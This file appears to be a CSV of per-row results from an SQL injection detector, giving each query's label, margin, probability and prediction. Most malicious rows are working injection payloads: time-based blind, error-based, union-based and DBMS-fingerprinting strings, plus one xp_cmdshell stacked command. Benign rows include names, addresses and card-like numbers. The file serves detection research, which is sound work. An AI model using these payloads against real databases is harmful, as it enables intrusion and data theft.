Query,Label,RawMargin,Prob_Raw,Pred_Default,Pred_BestThr,BestThr,BestThr_Margin
select  ( case when  ( 5423 = 7706 )  then 5423 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,10.863385200500488,0.9999808073043823,1,1,0.56,0.24116205681688824
contreras,0,-5.633310317993164,0.0035639682319015265,0,0,0.56,0.24116205681688824
1'||  (  select 'pyga' from dual where 8501  =  8501 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,13.689687728881836,0.9999988079071045,1,1,0.56,0.24116205681688824
navas de jorquera,0,-12.413187026977539,4.064616405230481e-06,0,0,0.56,0.24116205681688824
tharsis s/n 11?c,0,-8.242623329162598,0.000263123627519235,0,0,0.56,0.24116205681688824
kirland-lincovsky@la-sexta-f1.fo,0,-11.163430213928223,1.4183312487148214e-05,0,0,0.56,0.24116205681688824
7688900000000000,0,-8.091452598571777,0.00030605102074332535,0,0,0.56,0.24116205681688824
haker-durango@mirallesmoscardo.ro,0,-11.052599906921387,1.5845645975787193e-05,0,0,0.56,0.24116205681688824
"But connecting Internet surf , exchange emails , text download data still prohibited 10,000 feet , agency said",0,-13.435033798217773,1.4629797533416422e-06,0,0,0.56,0.24116205681688824
SELECT * FROM tone WHERE mathematics BETWEEN '1996-07-01' AND '1996-07-31',0,-10.069787979125977,4.233780055074021e-05,0,0,0.56,0.24116205681688824
"Psaki emphasised Ströbele &apos;s comments views parliamentarian , German government member",0,-14.064983367919922,7.792108931425901e-07,0,0,0.56,0.24116205681688824
finak,0,-6.077940940856934,0.0022876474540680647,0,0,0.56,0.24116205681688824
&quot; They comers two walked gold cup rosette,0,-12.743918418884277,2.9200161861808738e-06,0,0,0.56,0.24116205681688824
"-1816"" )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""dztr"" like ""dztr",1,8.55258846282959,0.9998070597648621,1,1,0.56,0.24116205681688824
florian@alcantarapartners.so,0,-11.414966583251953,1.1029052984667942e-05,0,0,0.56,0.24116205681688824
"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1,13.414857864379883,0.9999984502792358,1,1,0.56,0.24116205681688824
1',1,-0.7937129735946655,0.31137195229530334,0,0,0.56,0.24116205681688824
zuk,0,-3.1299359798431396,0.04188917949795723,0,0,0.56,0.24116205681688824
nagaraja,0,-6.454500198364258,0.0015709537547081709,0,0,0.56,0.24116205681688824
selene,0,-5.570723056793213,0.0037932826671749353,0,0,0.56,0.24116205681688824
74677553a,0,-11.828112602233887,7.296470812434563e-06,0,0,0.56,0.24116205681688824
"c/ alfabia, 147,",0,-8.363948822021484,0.0002330676361452788,0,0,0.56,0.24116205681688824
39638,0,-9.354982376098633,8.652570977574214e-05,0,0,0.56,0.24116205681688824
6424,0,-2.393299102783203,0.08368510007858276,0,0,0.56,0.24116205681688824
6920000000000000,0,-12.906543731689453,2.4817511530272895e-06,0,0,0.56,0.24116205681688824
"1""  )  )   )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (   ( ""enfu"" = ""enfu",1,11.718055725097656,0.9999918937683105,1,1,0.56,0.24116205681688824
"calle poador, 65 3a",0,-12.347416877746582,4.34093271906022e-06,0,0,0.56,0.24116205681688824
1834520000000000,0,-10.321039199829102,3.293178815511055e-05,0,0,0.56,0.24116205681688824
"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,11.349750518798828,0.9999881982803345,1,1,0.56,0.24116205681688824
"It &apos;s second job , said , funds 60% nonprofit; rest covered private donations",0,-10.063501358032227,4.260479181539267e-05,0,0,0.56,0.24116205681688824
SELECT AVG ( begun ) FROM band SELECT SUM ( chosen ),0,-8.427169799804688,0.00021879210544284433,0,0,0.56,0.24116205681688824
"1  )  )   and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,12.909124374389648,0.9999974966049194,1,1,0.56,0.24116205681688824
UPDATE shells SET shop = 'serious'WHERE loss = 'process',0,-10.924264907836914,1.801541293389164e-05,0,0,0.56,0.24116205681688824
Definitely Mr Obeid,0,-11.579392433166504,9.356850569020025e-06,0,0,0.56,0.24116205681688824
magdalen1,0,-6.038173675537109,0.0023802334908396006,0,0,0.56,0.24116205681688824
SELECT * FROM birth WHERE organization = 'consonant',0,-13.458813667297363,1.4286007399277878e-06,0,0,0.56,0.24116205681688824
SELECT TOP 50 PERCENT * FROM particularly,0,-12.9760160446167,2.3151910681917798e-06,0,0,0.56,0.24116205681688824
SELECT * FROM  ( SELECT discuss FROM quietly ),0,-13.808088302612305,1.0074488727696007e-06,0,0,0.56,0.24116205681688824
SELECT * FROM verb WHERE attention = 'train',0,-11.674224853515625,8.510300176567398e-06,0,0,0.56,0.24116205681688824
They teach us abide spontaneous impression good-humored inflexibility whole cry voices side,0,-15.677172660827637,1.5541408515673538e-07,0,0,0.56,0.24116205681688824
Users Twitter published photos SWAT officer weapon lying ground,0,-15.110631942749023,2.738645434874343e-07,0,0,0.56,0.24116205681688824
"-2044%'  )  )   or elt ( 9299 = 3618,3618 )  and   (  (  '%' = '",1,13.931528091430664,0.9999991655349731,1,1,0.56,0.24116205681688824
sotalbo,0,-6.287681579589844,0.0018556154100224376,0,0,0.56,0.24116205681688824
SELECT * FROM highway WHERE lucky = 'felt'  OR necessary = 'classroom',0,-12.231761932373047,4.873165835306281e-06,0,0,0.56,0.24116205681688824
9270,0,-8.04926586151123,0.0003192343283444643,0,0,0.56,0.24116205681688824
3621940000000000,0,-8.091452598571777,0.00030605102074332535,0,0,0.56,0.24116205681688824
"1"" where 7696 = 7696 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",1,11.31578540802002,0.9999878406524658,1,1,0.56,0.24116205681688824
"praza madrid, 98, 4?d",0,-11.778048515319824,7.671056664548814e-06,0,0,0.56,0.24116205681688824
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",1,8.921544075012207,0.9998664855957031,1,1,0.56,0.24116205681688824
The local authorities sold former Kindergarten Gartenstraße private buyer,0,-15.112823486328125,2.7326501594870933e-07,0,0,0.56,0.24116205681688824
sant esteve de la sarga,0,-10.833165168762207,1.973365760932211e-05,0,0,0.56,0.24116205681688824
"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",1,12.433367729187012,0.9999960660934448,1,1,0.56,0.24116205681688824
g89273t2,0,-9.641960144042969,6.494141416624188e-05,0,0,0.56,0.24116205681688824
SELECT * FROM Customers  WHERE City LIKE '[!bsp]%',0,-3.497175931930542,0.02939269132912159,0,0,0.56,0.24116205681688824
calle capitan palacios 71,0,-10.989914894104004,1.6870704712346196e-05,0,0,0.56,0.24116205681688824
"praza san antonio da florida, 27,",0,-11.424418449401855,1.0925300557573792e-05,0,0,0.56,0.24116205681688824
SELECT * FROM  ( SELECT tin FROM success ),0,-14.13842487335205,7.24035317034577e-07,0,0,0.56,0.24116205681688824
fanning_shepherd@bruoseguridad.name,0,-10.27102279663086,3.462074892013334e-05,0,0,0.56,0.24116205681688824
4815643958728547,0,-8.091452598571777,0.00030605102074332535,0,0,0.56,0.24116205681688824
1'  )   where 4509  =  4509 union all select null--,1,12.286508560180664,0.9999953508377075,1,1,0.56,0.24116205681688824
tomi,0,-4.650051593780518,0.009470559656620026,0,0,0.56,0.24116205681688824
siomara,0,-6.287681579589844,0.0018556154100224376,0,0,0.56,0.24116205681688824
"select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,10.035614013671875,0.9999561309814453,1,1,0.56,0.24116205681688824
9380,0,-8.04926586151123,0.0003192343283444643,0,0,0.56,0.24116205681688824
"select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,10.306554794311523,0.9999666213989258,1,1,0.56,0.24116205681688824
SELECT AVG ( elephant ) FROM cheese SELECT SUM ( individual ),0,-9.95314884185791,4.7575318603776395e-05,0,0,0.56,0.24116205681688824
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",1,8.953899383544922,0.999870777130127,1,1,0.56,0.24116205681688824
"-5597'  )   or make_set  (  2490  =  2164,2164  )",1,11.54149055480957,0.9999902248382568,1,1,0.56,0.24116205681688824
"-1076 union all select 3959,3959--",1,8.864480018615723,0.9998587369918823,1,1,0.56,0.24116205681688824
select   (  case when   (  4306  =  2815  )   then 4306 else 1/  (  select 0  )   end  )  --,1,12.25705337524414,0.999995231628418,1,1,0.56,0.24116205681688824
"&quot; We seek reward , except reward history critical time serve community , &quot; said",0,-13.546467781066895,1.3087095567243523e-06,0,0,0.56,0.24116205681688824
ersil,0,-6.077940940856934,0.0022876474540680647,0,0,0.56,0.24116205681688824
SELECT AVG ( ready ) FROM pure SELECT SUM ( chapter ),0,-8.462674140930176,0.000211161925108172,0,0,0.56,0.24116205681688824
6429,0,-2.393299102783203,0.08368510007858276,0,0,0.56,0.24116205681688824
villarejo de fuentes,0,-9.665761947631836,6.341403059195727e-05,0,0,0.56,0.24116205681688824
"1%' )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( '%' = '",1,15.454936027526855,0.9999997615814209,1,1,0.56,0.24116205681688824
alises,0,-5.570723056793213,0.0037932826671749353,0,0,0.56,0.24116205681688824
"According statement , man hid woman forest near Helmstedt",0,-15.127904891967773,2.6917473405774217e-07,0,0,0.56,0.24116205681688824
"As pastoral workers , ministers close people",0,-11.005513191223145,1.6609597878414206e-05,0,0,0.56,0.24116205681688824
select sleep  (  5  )   and 'beuk'  =  'beuk,1,12.925622940063477,0.999997615814209,1,1,0.56,0.24116205681688824
9771406974624162,0,-8.091452598571777,0.00030605102074332535,0,0,0.56,0.24116205681688824
"1""  )   where 2367  =  2367",1,10.907722473144531,0.9999816417694092,1,1,0.56,0.24116205681688824
select pg_sleep  (  5  )   and   (  '%'  =  ',1,14.433752059936523,0.9999994039535522,1,1,0.56,0.24116205681688824
rini,0,-4.650051593780518,0.009470559656620026,0,0,0.56,0.24116205681688824
"SELECT leg,group,travel FROM shelter LEFT JOIN Orders ON chest.solidID =  could.frozen ORDER BY fear.so",0,-8.076289176940918,0.0003107257070951164,0,0,0.56,0.24116205681688824
"1""  )  )   as rfgu where 4880 = 4880 union all select null,null,null,null,null,null,null,null,null--",1,10.421867370605469,0.9999701976776123,1,1,0.56,0.24116205681688824
3u*3m15i92,0,-13.13727855682373,1.9703870748344343e-06,0,0,0.56,0.24116205681688824
10836981w,0,-11.828112602233887,7.296470812434563e-06,0,0,0.56,0.24116205681688824
FROM  ( SELECT DISTINCT sit FROM create ),0,-10.492857933044434,2.7733050956157967e-05,0,0,0.56,0.24116205681688824
-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,1,11.705206871032715,0.999991774559021,1,1,0.56,0.24116205681688824
"1""  )  )   )  waitfor delay '0:0:5'--",1,10.982722282409668,0.9999829530715942,1,1,0.56,0.24116205681688824
-7984' order by 1--,1,8.573565483093262,0.9998109936714172,1,1,0.56,0.24116205681688824
29%,1,2.275388240814209,0.9068180918693542,1,1,0.56,0.24116205681688824
24711,0,-9.354982376098633,8.652570977574214e-05,0,0,0.56,0.24116205681688824
17732,0,-9.354982376098633,8.652570977574214e-05,0,0,0.56,0.24116205681688824
19127,0,-9.354982376098633,8.652570977574214e-05,0,0,0.56,0.24116205681688824
1479,0,-6.790193557739258,0.0011234874837100506,0,0,0.56,0.24116205681688824
"-2333' union all select 9714,9714,9714--",1,13.961234092712402,0.9999991655349731,1,1,0.56,0.24116205681688824
-7497' )  as kjzt where 3758 = 3758 or 4794 = 9499--,1,15.761534690856934,0.9999998807907104,1,1,0.56,0.24116205681688824
SELECT * FROM who WHERE pure BETWEEN round09/01/1996believed AND four15/31/1996build,0,-13.382591247558594,1.5417494978464674e-06,0,0,0.56,0.24116205681688824
"On Thursday , data showed continued export weakness , softening consumer demand",0,-13.141548156738281,1.9619922113633947e-06,0,0,0.56,0.24116205681688824
7549,0,-3.8967106342315674,0.019904376938939095,0,0,0.56,0.24116205681688824
SELECT COUNT ( seven ) FROM mother,0,-10.47258186340332,2.830109224305488e-05,0,0,0.56,0.24116205681688824
"1""  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )",1,5.583648681640625,0.9962552785873413,1,1,0.56,0.24116205681688824
"1%'  )   union all select null,null,null,null,null,null,null,null,null#",1,9.242586135864258,0.9999032020568848,1,1,0.56,0.24116205681688824
1'  )  )   and sleep ( 5 )  and   (  (  'tcwt' = 'tcwt,1,14.83059310913086,0.9999996423721313,1,1,0.56,0.24116205681688824
"end and  ( ""vwbx"" = ""vwbx",1,5.714378356933594,0.9967126846313477,1,1,0.56,0.24116205681688824
delete,1,-5.570723056793213,0.0037932826671749353,0,0,0.56,0.24116205681688824
juventino,0,-5.633310317993164,0.0035639682319015265,0,0,0.56,0.24116205681688824
"Always scorn appearances, always may",0,-12.010960578918457,6.07719903200632e-06,0,0,0.56,0.24116205681688824
SELECT lady ( s )  FROM swung,0,-10.277997016906738,3.4380140277789906e-05,0,0,0.56,0.24116205681688824
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )",1,12.498629570007324,0.9999963045120239,1,1,0.56,0.24116205681688824
.espejo,0,-5.952033996582031,0.0025938001926988363,0,0,0.56,0.24116205681688824
SELECT * FROM common ORDER BY should DESC,0,-13.581090927124023,1.2641733064810978e-06,0,0,0.56,0.24116205681688824
6966780000000000,0,-10.46807861328125,2.8428823497961275e-05,0,0,0.56,0.24116205681688824
sant lloren des cardassar,0,-10.896958351135254,1.8514119801693596e-05,0,0,0.56,0.24116205681688824
"SELECT   COALESCE ( NULL, NULL, NULL, 'W3Schools.com', NULL, 'Example.com' ) ;",0,-5.175577640533447,0.005621174816042185,0,0,0.56,0.24116205681688824
"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,13.516094207763672,0.9999986886978149,1,1,0.56,0.24116205681688824
blava,0,-6.077940940856934,0.0022876474540680647,0,0,0.56,0.24116205681688824
urkiaga,0,-6.287681579589844,0.0018556154100224376,0,0,0.56,0.24116205681688824
1  )  )   as xbii where 2262 = 2262 or sleep ( 5 ) --,1,14.673470497131348,0.9999995231628418,1,1,0.56,0.24116205681688824
thalasso.chappell@titulosoficiales.jp,0,-9.294893264770508,9.188386320602149e-05,0,0,0.56,0.24116205681688824
hinson,0,-5.570723056793213,0.0037932826671749353,0,0,0.56,0.24116205681688824
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",1,12.771612167358398,0.9999971389770508,1,1,0.56,0.24116205681688824
SELECT social ( s )  FROM test,0,-10.515453338623047,2.7113454052596353e-05,0,0,0.56,0.24116205681688824
bru_na,0,-5.531675815582275,0.003943733870983124,0,0,0.56,0.24116205681688824
SELECT * FROM lack WHERE dark LIKE '%effort%',0,-9.928688049316406,4.875333979725838e-05,0,0,0.56,0.24116205681688824
"The experience Theresa Rütten , head citizen &apos;s Life Old Age service State Capital , also &apos; majority old people Stuttgart want remain homes long possible &apos;",0,-9.25685977935791,9.544549538986757e-05,0,0,0.56,0.24116205681688824
-2372' or 1783  =  2656,1,6.8350019454956055,0.9989256262779236,1,1,0.56,0.24116205681688824
"select * from users where id = 1 or "",?"" or 1 = 1 -- 1",1,10.348986625671387,0.9999679327011108,1,1,0.56,0.24116205681688824
?revivir,0,-2.6218295097351074,0.06774664670228958,0,0,0.56,0.24116205681688824
SELECT AVG ( nails ) FROM principal SELECT SUM ( lungs ),0,-9.853288650512695,5.257124576019123e-05,0,0,0.56,0.24116205681688824
0,1,-2.393299102783203,0.08368510007858276,0,0,0.56,0.24116205681688824
kepekci,0,-6.287681579589844,0.0018556154100224376,0,0,0.56,0.24116205681688824
4755757006243984,0,-8.091452598571777,0.00030605102074332535,0,0,0.56,0.24116205681688824
"SELECT COUNT ( negative ) , mad FROM bend BY story",0,-7.529236316680908,0.0005368599086068571,0,0,0.56,0.24116205681688824
92621448b,0,-11.828112602233887,7.296470812434563e-06,0,0,0.56,0.24116205681688824
or 1  =  1--,1,7.827182769775391,0.999601423740387,1,1,0.56,0.24116205681688824
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'tmdj' like 'tmdj",1,12.044262886047363,0.999994158744812,1,1,0.56,0.24116205681688824
"SELECT be AS up, solution AS [political]  FROM seed",0,-10.808806419372559,2.0220237274770625e-05,0,0,0.56,0.24116205681688824
"c/ fray diego de cadiz, 50",0,-11.77553939819336,7.690327947784681e-06,0,0,0.56,0.24116205681688824
683880000000000,0,-3.6858596801757812,0.024462204426527023,0,0,0.56,0.24116205681688824
SELECT * FROM clay WHERE usual IN  ( SELECT circle FROM various ),0,-14.026825904846191,8.095180987766071e-07,0,0,0.56,0.24116205681688824
entendimiento,0,-7.789119243621826,0.0004140460805501789,0,0,0.56,0.24116205681688824
"SELECT * FROM making ORDER BY officer ASC, history DESC",0,-12.393853187561035,4.143965725234011e-06,0,0,0.56,0.24116205681688824
rond,0,-4.650051593780518,0.009470559656620026,0,0,0.56,0.24116205681688824
clech@ofertachina.lb,0,-8.59140396118164,0.00018566071230452508,0,0,0.56,0.24116205681688824
*paci3nte,0,-7.761629104614258,0.00042558120912872255,0,0,0.56,0.24116205681688824
cea,0,-3.1299359798431396,0.04188917949795723,0,0,0.56,0.24116205681688824
"1""  )   where 7452  =  7452",1,10.907722473144531,0.9999816417694092,1,1,0.56,0.24116205681688824
polopos,0,-6.287681579589844,0.0018556154100224376,0,0,0.56,0.24116205681688824
SELECT COUNT ( boneID ) FROM blank,0,-10.47258186340332,2.830109224305488e-05,0,0,0.56,0.24116205681688824
"1 union all select null,null,null--",1,6.4063310623168945,0.9983516931533813,1,1,0.56,0.24116205681688824
An employee &quot; Los Angeles Times &quot; travelling time told heard two shots fired,0,-11.354077339172363,1.1721461305569392e-05,0,0,0.56,0.24116205681688824
"1'+  (  select 'yfrs' where 4388  =  4388 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,11.555283546447754,0.9999904632568359,1,1,0.56,0.24116205681688824
"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,12.291879653930664,0.9999954700469971,1,1,0.56,0.24116205681688824
"-6581'||  (  select 'hpjd' where 7608  =  7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",1,13.731907844543457,0.999998927116394,1,1,0.56,0.24116205681688824
"1'+ ( select uzan where 4312 = 4312 and make_set ( 3129 = 9555,9555  )  )  +'",1,13.616267204284668,0.9999988079071045,1,1,0.56,0.24116205681688824
"Behind dispute race plane orders least $ 700-billion estimated business list prices coming decades , enough tip scales U",0,-10.177489280700684,3.801509228651412e-05,0,0,0.56,0.24116205681688824
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --",1,6.19412899017334,0.9979628324508667,1,1,0.56,0.24116205681688824
"admin""  )   or   (  ""1""  =  ""1""#",1,9.169965744018555,0.9998959302902222,1,1,0.56,0.24116205681688824
1pa5364e3a,0,-10.911330223083496,1.8249946151627228e-05,0,0,0.56,0.24116205681688824
"select * from users where id = 1 <@1$ union select 1,version (  )  -- 1",1,10.45153522491455,0.9999711513519287,1,1,0.56,0.24116205681688824
"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--",1,10.36131763458252,0.999968409538269,1,1,0.56,0.24116205681688824
"SELECT * FROM long WHERE contain NOT IN  ( 'southern', 'two', 'desk' )",0,-11.595473289489746,9.207588846038561e-06,0,0,0.56,0.24116205681688824
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit",1,8.408795356750488,0.9997771382331848,1,1,0.56,0.24116205681688824
"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,12.282862663269043,0.9999953508377075,1,1,0.56,0.24116205681688824
This sculpture memory without preestablished harmony,0,-11.900681495666504,6.7857322392228525e-06,0,0,0.56,0.24116205681688824
"1"" where 4319 = 4319",1,8.090370178222656,0.9996936321258545,1,1,0.56,0.24116205681688824
"select * from users where id = 1 or ""{%"" or 1 = 1 -- 1",1,10.348986625671387,0.9999679327011108,1,1,0.56,0.24116205681688824
"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",1,11.785215377807617,0.9999923706054688,1,1,0.56,0.24116205681688824
grecia,0,-5.570723056793213,0.0037932826671749353,0,0,0.56,0.24116205681688824
SELECT AVG ( distant ) FROM area SELECT SUM ( show ),0,-8.427169799804688,0.00021879210544284433,0,0,0.56,0.24116205681688824
1 )  as tngy where 8956 = 8956 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --,1,11.92374324798584,0.9999933242797852,1,1,0.56,0.24116205681688824
27c01a,0,-6.795341491699219,0.0011177250416949391,0,0,0.56,0.24116205681688824
"1 where 1062 = 1062 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,12.741336822509766,0.9999970197677612,1,1,0.56,0.24116205681688824
"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",1,15.293306350708008,0.9999997615814209,1,1,0.56,0.24116205681688824
23531966e,0,-11.828112602233887,7.296470812434563e-06,0,0,0.56,0.24116205681688824
&quot; The news came day Credit Suisse announced dismissed trader London exchange traded funds desk week caused nearly $ 6m loss late last year,0,-13.939228057861328,8.836286724545062e-07,0,0,0.56,0.24116205681688824
"c/ leopoldo alas ""clarin"" 4, 6?b",0,-11.559971809387207,9.540341125102714e-06,0,0,0.56,0.24116205681688824
"&quot; It really comes providing flexibility airlines allowing things believe need successful , &quot; said Boeing cabins expert Kent Craver",0,-14.927355766296387,3.2895135859689617e-07,0,0,0.56,0.24116205681688824
select  ( case when  ( 5856 = 7176 )  then 5856 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,10.863385200500488,0.9999808073043823,1,1,0.56,0.24116205681688824
-2456'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'bbkp'  =  'bbkp,1,13.274645805358887,0.9999983310699463,1,1,0.56,0.24116205681688824
"1  )   as asmt where 4986  =  4986 union all select null,null#",1,10.043288230895996,0.999956488609314,1,1,0.56,0.24116205681688824
24387950s,0,-11.828112602233887,7.296470812434563e-06,0,0,0.56,0.24116205681688824
towney,0,-5.570723056793213,0.0037932826671749353,0,0,0.56,0.24116205681688824
"In June , Rio suspended use railway week Renamo threatened attack line",0,-13.045354843139648,2.160097892556223e-06,0,0,0.56,0.24116205681688824
1'+ ( select vfmy where 5711 = 5711,1,6.530405521392822,0.9985437393188477,1,1,0.56,0.24116205681688824
1  )  )   as oqyo where 7995 = 7995,1,8.868762969970703,0.9998593330383301,1,1,0.56,0.24116205681688824
focas@programaciones.com.sz,0,-10.714334487915039,2.2223577616387047e-05,0,0,0.56,0.24116205681688824
-9405' union all select 2539--,1,9.609480857849121,0.9999328851699829,1,1,0.56,0.24116205681688824
"1%""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""%""  =  """,1,12.63064193725586,0.9999967813491821,1,1,0.56,0.24116205681688824
camponaraya,0,-6.087696552276611,0.0022654891945421696,0,0,0.56,0.24116205681688824
ad28rsari!a,0,-4.8173370361328125,0.008023401722311974,0,0,0.56,0.24116205681688824
SELECT storm ( s )  FROM property SELECT mood ( s ),0,-6.974129676818848,0.0009349056053906679,0,0,0.56,0.24116205681688824
-4484'   )    )    or 6872  =  6872 and    (    (   'oxuo'  =  'oxuo,1,13.633866310119629,0.9999988079071045,1,1,0.56,0.24116205681688824
He added: &quot; It unable fly contacted help,0,-12.517680168151855,3.6613309930544347e-06,0,0,0.56,0.24116205681688824
50491,0,-9.354982376098633,8.652570977574214e-05,0,0,0.56,0.24116205681688824
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,8.932499885559082,0.9998679161071777,1,1,0.56,0.24116205681688824
"1""   )    )    as vtad where 3653  =  3653 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,9.745392799377441,0.9999414682388306,1,1,0.56,0.24116205681688824
-2165' where 6593  =  6593 or 9158  =  7254--,1,14.128485679626465,0.9999992847442627,1,1,0.56,0.24116205681688824
It make changes core subjects next year,0,-14.757014274597168,3.9004072505122167e-07,0,0,0.56,0.24116205681688824
"1""  )  )   as jrld where 3488 = 3488",1,10.099678993225098,0.999958872795105,1,1,0.56,0.24116205681688824
07260,0,-9.354982376098633,8.652570977574214e-05,0,0,0.56,0.24116205681688824
1  )  ),1,-2.218250036239624,0.09812355786561966,0,0,0.56,0.24116205681688824
buffet@aou.com.tn,0,-10.196170806884766,3.7311529013095424e-05,0,0,0.56,0.24116205681688824
"INSERT INTO more  ( relationship, why, hand )  VALUES  ( 'empty', 'expect', 'war' )",0,-8.491068840026855,0.00020525157742667943,0,0,0.56,0.24116205681688824
-8453   )    )     )   or 3038  =  3038,1,8.563066482543945,0.9998090863227844,1,1,0.56,0.24116205681688824
gumersindo,0,-6.293900012969971,0.001844133366830647,0,0,0.56,0.24116205681688824
